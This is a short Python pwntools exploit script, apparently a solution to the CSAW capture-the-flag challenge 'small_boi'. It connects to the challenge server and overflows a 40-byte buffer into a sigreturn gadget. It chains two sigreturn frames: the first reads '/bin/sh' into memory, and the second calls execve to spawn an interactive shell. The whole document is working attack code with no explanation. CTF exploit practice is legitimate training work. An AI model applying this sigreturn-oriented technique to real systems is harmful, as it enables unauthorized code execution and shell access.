from pwn import *
import time
io=remote("pwn.chal.csaw.io",1002)
#io=process("./small_boi")
sig=0x400180
context.clear(arch="amd64")
payload="a"*40+p64(sig)

# read
frame = SigreturnFrame(kernel="amd64")
frame.rax=0
frame.rdi=0
frame.rsi=0x601b20
frame.rdx=80
frame.rsp=0x601b20+64
frame.rip=0x0000000000400185
payload+=str(frame)
#gdb.attach(io)
io.send(payload.ljust(0x200,"\x00"))
raw_input()
io.send("/bin/sh\x00"+p64(0)*8+p64(0x4001ad))
raw_input()
payload3="1"*40+p64(sig)
frame = SigreturnFrame(kernel="amd64")
frame.rax=59
frame.rdi=0x601b20
frame.rsi=0
frame.rdx=0
frame.rsp=0x601b20+64
frame.rip=0x0000000000400185
payload3+=str(frame)
io.send(payload3.ljust(0x200,"\x00"))
io.interactive()
